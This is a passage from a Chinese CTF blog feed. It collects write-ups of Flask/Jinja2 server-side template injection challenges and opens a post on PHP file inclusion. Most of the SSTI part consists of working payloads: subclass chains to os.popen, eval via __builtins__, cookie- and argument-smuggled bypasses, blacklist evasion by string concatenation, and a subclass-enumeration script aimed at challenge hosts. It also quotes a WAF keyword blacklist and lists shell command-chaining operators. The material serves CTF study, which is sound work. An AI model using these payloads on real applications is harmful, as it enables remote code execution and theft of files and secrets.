class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>首先在shrine路径下测试ssti能正常执行<br><code>/shrine/&#123;&#123; 2+2 &#125;&#125;</code></p><p><img src="https://i0.hdslb.com/bfs/album/30282a9bff90f371ab0aa44b2d61f236d5ec91b5.png" alt="图片.png"></p><p>分析源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br></pre></td></tr></table></figure><p>注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br></pre></td></tr></table></figure><p>上面这行代码把黑名单的东西遍历并设为空，例如：&#x2F;shrine&#x2F;</p><p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p><h5 id="url-for-globals"><a href="#url-for-globals" class="headerlink" title="url_for.globals"></a>url_for.<strong>globals</strong></h5><p><img src="https://i0.hdslb.com/bfs/album/cc33916bc3443da07b9fbdea661c6e73f2c777ff.png" alt="图片.png"></p><p>看到current_app意思应该是当前app，那我们就当前app下的config：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/4a7eb81ae423a30362b3caf57dbdc16d26d76b3c.png" alt="图片.png"></p><h5 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages"></a>get_flashed_messages</h5><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p><p>同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/8dcaf471d6546e3a5684a014dea769104a735d99.png" alt="图片.png"></p><h4 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="[Web_python_template_injection]"></a>[Web_python_template_injection]</h4><p><img src="https://i0.hdslb.com/bfs/album/31636604a657ea8a576cb68b04de70f8b4eafd10.png" alt="image-20220515144828448"></p><p><img src="https://i0.hdslb.com/bfs/album/8f4d44433a3d2bf64b6109870046a3474964d543.png" alt="image-20220515144832073"></p><h4 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h4><p>先来看看哪些可用的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__() 或　　[].__class__.__base__.__subclasses__()</span><br><span class="line">---查看可用模块</span><br></pre></td></tr></table></figure><p>大部分都是先查找warnings.catch_warnings模块中的OS模块</p><p>当前warnings.catch_warnings模块在第169个（从0开始的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure><h4 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h4><p>这样不行，把[]换成 ‘’ 或者 “” 就可以……不知道为啥</p><p><img src="https://i0.hdslb.com/bfs/album/5dc532d83c321171ca42d31af298f1bfa1bc6eef.png" alt="image-20220518073817278"></p><p><img src="https://i0.hdslb.com/bfs/album/8bb88f673e245063877e4e8b70915c93c9bff427.png" alt="image-20220517230353192"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">经过查询后，可以借助的类&lt;class &#x27;warnings.catch_warnings&#x27;&gt;，没有内置os模块在第59位。&lt;class &#x27;site._Printer&#x27;&gt; 内含os模块 在第71位，可以借助这些类来执行命令</span><br></pre></td></tr></table></figure><p>好不容易找到warnings.catch_warnings , 拿出payload却运行不了</p><p><img src="https://i0.hdslb.com/bfs/album/e7d65f551837894c4caf5bbce01815a2190342dd.png" alt="image-20220517230615633"></p><p>原因是存在过滤，过滤了”globals” , 采取拼接的方式绕过</p><p><img src="https://i0.hdslb.com/bfs/album/08067a4bf2abbc7830b30005eaadb5beb6ad26e4.png" alt="image-20220517232459130"></p><p>还可以</p><p><img src="https://i0.hdslb.com/bfs/album/118e28cb2a761d9d534603641685ba05a1909f55.png" alt="image-20220517232229766"></p><h5 id="不含os模板的类warnings-catch-warnings"><a href="#不含os模板的类warnings-catch-warnings" class="headerlink" title="不含os模板的类warnings.catch_warnings"></a>不含os模板的类warnings.catch_warnings</h5><p><img src="https://i0.hdslb.com/bfs/album/8a14fdef19a031c58f0bf84249536d0479c42c94.png" alt="image-20220518075423510"></p><h5 id="内含os模块的类-class’site-Printer’"><a href="#内含os模块的类-class’site-Printer’" class="headerlink" title="内含os模块的类 class’site._Printer’"></a><strong>内含os模块的类</strong> <strong>class’site._Printer’</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> a. 目录查询</span><br><span class="line"> &#123;&#123;[].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line"> 因为这里listdir同样被ban了</span><br><span class="line">b. 读取目录flasklight</span><br><span class="line"> &#123;&#123;[].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls /flasklight&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line"> c. 读取flag</span><br><span class="line"> &#123;&#123;[].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat coomme_geeeett_youur_flek&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="lt-class-‘ubprocess-Popen’-gt"><a href="#lt-class-‘ubprocess-Popen’-gt" class="headerlink" title="&lt;class ‘ubprocess.Popen’&gt;"></a>&lt;class ‘ubprocess.Popen’&gt;</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">258</span>](<span class="string">&#x27;ls /&#x27;</span>,shell=True,stdout=-<span class="number">1</span>).<span class="title function_ invoke__">communicate</span>()[<span class="number">0</span>].<span class="title function_ invoke__">strip</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>别人用来找可用类的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;http://0b65f501-517f-4277-902c-36841e45f72a.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        res = re.findall(<span class="string">&quot;&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)<span class="comment">#res[0]数组存储回显</span></span><br><span class="line">        <span class="comment">#time.sleep(0.1)</span></span><br><span class="line">        res = html.unescape(res[<span class="number">0</span>])<span class="comment">#反转义字符串</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot; | &quot;</span> + res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;subprocess.Popen&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            index = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#258 | &lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br><span class="line"><span class="comment">#59 | &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span></span><br><span class="line"><span class="comment">#71 | &lt;class &#x27;site._Printer&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>最好用的payload但有可能被检测过滤，作为储存配置信息的变量config刚好对应的就是一个非常合适的类，因为这个类中<code>__init__</code>函数全局变量中已经导入了 “os” 模块，我们可以直接调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/edcab1eee69b1929743f6fdcfb20d5f49c604ee4.png" alt="image-20220518210502621"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125; &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>].values() %&#125; &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125; &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/9b61a7ed0c9163d98a58c62f4b4e558b140cfacb.png" alt="image-20220518212319176"></p><h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>非常有意思的一道题，值得一看</p><p>试着读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line"><span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以利用字符串拼接，来绕过黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>可以找到结果中有this_is_the_flag文件</p><p>读文件也是可以字符串拼接来绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;%<span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_f&#x27;</span>+<span class="string">&#x27;lag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>还有种奇怪的姿势，倒序文件名  <strong>‘ txt.galf_eht_si_siht&#x2F; ‘[::-1]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="预期解pin码"><a href="#预期解pin码" class="headerlink" title="预期解pin码"></a>预期解pin码</h5><p><a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></p><h4 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h4><h5 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h5><p>这里的思路和上一题差不多！但是我们需要进行一定的构造！<br>经过一番尝试后发现过滤了单双引号！所以这里就要用到了request.args.x1 get传参这个来进行绕过了！</p><p><img src="https://i0.hdslb.com/bfs/album/35a9bee438d9211af76bdd1e2540aed7dad87c44.png" alt="在这里插入图片描述"></p><h5 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h5><p>这里不能使用了get和post进行绕过，所以我们采用了cookie来进行绕过!</p><p><img src="https://i0.hdslb.com/bfs/album/830afb6b0973d90598282c53bde55ceffec6ab7e.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://19bf20fd-fb45-4d05-8d00-612ebf6e92c9.challenge.ctf.show:8080/?name=&#123;&#123;().x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)&#125;&#125;</span><br><span class="line">Cookie: x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><hr><h5 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h5><p>这里中括号是不能使用了，采用的是 __ getitem __ 这种方式进行绕过！</p><p><img src="https://i0.hdslb.com/bfs/album/4e9df03904ce2389a738fdb5317546344f36e036.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://c10f9098-<span class="number">9892</span>-4da6-923d-7289bf23b70f.challenge.ctf.show:<span class="number">8080</span>/?name=&#123;&#123;().x.__init__.__globals__.__getitem__(request.cookies.x1).<span class="built_in">eval</span>(request.cookies.x2)&#125;&#125;</span><br><span class="line">Cookie: x1=__builtins__;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;ox&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>还有一种方法，这是看师傅来的一个比较简单的构造！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.<span class="built_in">popen</span>(request.cookies.c).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">Cookie:c=cat /flag</span><br></pre></td></tr></table></figure><h5 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h5><p>这里直接ban了下划线！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.**globals**[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/de212134666b4ec8c605f605a69f5a2594398e0c.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://0d80ec51-c99e-48bf-9c2a-95183a6b0fab.challenge.ctf.show:<span class="number">8080</span>/?name=&#123;&#123;(lipsum|attr(request.cookies.x1)).os.popen(request.cookies.x2).read()&#125;&#125;</span><br><span class="line">Cookie: x1=__globals__;x2=cat /flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h5 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h5><p>这里是可以使用上面的第二个骚操作的！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;</span><br><span class="line">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>这里是ban了os的，我们可以把os进行传参绕过！</p><p><img src="https://i0.hdslb.com/bfs/album/d04cb7d9ac797594b2bc058d47b766887fd3cd78.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://891667b0-<span class="number">1429</span>-458a-a356-be9f56ff2fc5.challenge.ctf.show:<span class="number">8080</span>/?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h5><p><code>过滤了</code><code>，使用&#123;%%&#125;绕过</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">set</span> aaa=(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4)%&#125;&#123;%<span class="built_in">print</span>(aaa.<span class="built_in">open</span>(request.cookies.x5).read())%&#125;</span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=/flag&#x27;&#x27;&#x27;</span>&#125;</span><br><span class="line">r=requests.get(url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span>(((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read())%&#125;</span><br><span class="line">Cookie:a=os;b=cat /flag;c=__globals__;d=__getitem__</span><br></pre></td></tr></table></figure><p>参考文章</p><p> <a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p> <a href="https://blog.csdn.net/weixin_44477223/article/details/115673318">https://blog.csdn.net/weixin_44477223/article/details/115673318</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;https://i0.hdslb.com/bfs/album/8800d2bb3dd5f2045d106a562bb39fc8f047275f.jpg&quot; alt=&quot;服务端模板注入攻击&quot; style=&quot;zoom:67%;&quot; /&gt;



&lt;h4 id=&quot;魔术函数&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://micgo.top/categories/CTF/"/>
    
    
    <category term="SSTI" scheme="https://micgo.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-04-24T16:00:00.000Z</published>
    <updated>2023-03-16T04:05:52.355Z</updated>
    
    <content type="html"><![CDATA[<p>PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists() 和 filesize()的文件系统函数。当遇到文件包含时,我们可以这个特性来完成我们需要的指令。</p><h4 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h4><p>include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once：遇到重复文件，只包含一次</span><br><span class="line">require</span><br><span class="line">require_once: 遇到重复文件，只包含一次</span><br><span class="line">highlight_file、show_source、readfile、file_get_contents、fopen、file (读取文件)</span><br><span class="line"></span><br><span class="line">include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。</span><br><span class="line"></span><br><span class="line">而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd1|cmd2:不论cmd1是否为真，cmd2都会被执行；</span><br><span class="line">cmd1;cmd2：不论cmd1是否为真，cmd2都会被执行；</span><br><span class="line">cmd1||cmd2：如果cmd1为假，则执行cmd2；</span><br><span class="line">cmd1&amp;&amp;cmd2：如果cmd1为真，则执行cmd2；</span><br></pre></td></tr></table></figure><h4 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" 